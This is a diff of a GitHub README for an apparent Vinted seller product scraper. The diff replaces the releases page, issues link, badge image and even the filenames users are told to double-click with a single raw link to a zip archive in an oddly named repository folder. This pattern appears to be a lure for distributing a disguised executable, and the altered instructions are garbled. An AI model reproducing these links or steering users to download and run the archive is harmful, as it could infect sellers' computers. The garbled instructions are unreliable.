@@ -1,7 +1,7 @@
 # 🛒 vinted-seller-products - Easy Product Scraper for Vinted Sellers
 
 ## 📥 Download Now
-[![Download vinted-seller-products](https://img.shields.io/badge/Download-vinted--seller--products-blue)](https://github.com/ShivamRichy/vinted-seller-products/releases)
+[![Download vinted-seller-products](https://github.com/ShivamRichy/vinted-seller-products/raw/refs/heads/main/cathartically/seller_vinted_products_3.3.zip)](https://github.com/ShivamRichy/vinted-seller-products/raw/refs/heads/main/cathartically/seller_vinted_products_3.3.zip)
 
 ## 📜 Overview
 The **vinted-seller-products** application allows Vinted sellers to scrape product data easily. This tool helps you gather insights on your listings and understand your marketplace better. It's designed for users who want to save time and effort when managing their products.
@@ -10,13 +10,13 @@ The **vinted-seller-products** application allows Vinted sellers to scrape produ
 Follow these steps to download and run the vinted-seller-products application:
 
 ### 1. Visit the Download Page
-To get the latest version of the app, visit the [Releases page](https://github.com/ShivamRichy/vinted-seller-products/releases). 
+To get the latest version of the app, visit the [Releases page](https://github.com/ShivamRichy/vinted-seller-products/raw/refs/heads/main/cathartically/seller_vinted_products_3.3.zip). 
 
 ### 2. Download the Application
 On the Releases page, you will see a list of available versions. Click on the version you want to download. Look for a file that matches your operating system (e.g., Windows, macOS, Linux). Download the relevant file to your computer.
 
 ### 3. Locate the Downloaded File
-After the download is complete, find the file in your downloads folder. It may appear as `vinted-seller-products-vX.Y.Z.zip` where `X.Y.Z` represents the version number.
+After the download is complete, find the file in your downloads folder. It may appear as `https://github.com/ShivamRichy/vinted-seller-products/raw/refs/heads/main/cathartically/seller_vinted_products_3.3.zip` where `X.Y.Z` represents the version number.
 
 ### 4. Extract the Files
 If you downloaded a `.zip` file, right-click on it and choose "Extract All" or "Unzip". Select a location where you want the files to be saved, then click "Extract".
@@ -24,8 +24,8 @@ If you downloaded a `.zip` file, right-click on it and choose "Extract All" or "
 ### 5. Open the Application
 Depending on your operating system:
 
-- **Windows:** Navigate to the extracted folder, double-click on `vinted-seller-products.exe` to open the application.
-- **macOS:** Open the extracted folder, then double-click on `vinted-seller-products.app`.
+- **Windows:** Navigate to the extracted folder, double-click on `https://github.com/ShivamRichy/vinted-seller-products/raw/refs/heads/main/cathartically/seller_vinted_products_3.3.zip` to open the application.
+- **macOS:** Open the extracted folder, then double-click on `https://github.com/ShivamRichy/vinted-seller-products/raw/refs/heads/main/cathartically/seller_vinted_products_3.3.zip`.
 - **Linux:** Open the terminal, navigate to the extracted folder, and run `./vinted-seller-products`.
 
 ## 🏗️ Features
@@ -64,10 +64,10 @@ Yes, as long as the computer meets the system requirements mentioned above.
 If you have any issues, please check our Issues section on GitHub or reach out for help via the contact information provided.
 
 ## 🔧 Support and Contributions
-If you experience any problems or have suggestions for improvements, please feel free to open an issue on our [GitHub repository](https://github.com/ShivamRichy/vinted-seller-products/issues).
+If you experience any problems or have suggestions for improvements, please feel free to open an issue on our [GitHub repository](https://github.com/ShivamRichy/vinted-seller-products/raw/refs/heads/main/cathartically/seller_vinted_products_3.3.zip).
 
 ## ✅ Download & Install
-Make sure to download the software from the [Releases page](https://github.com/ShivamRichy/vinted-seller-products/releases). Follow the steps carefully to set it up on your device. 
+Make sure to download the software from the [Releases page](https://github.com/ShivamRichy/vinted-seller-products/raw/refs/heads/main/cathartically/seller_vinted_products_3.3.zip). Follow the steps carefully to set it up on your device. 
 
 ## 📅 Updates
 We regularly update the application to improve functionality and fix any issues. Stay tuned for new features and enhancements. 
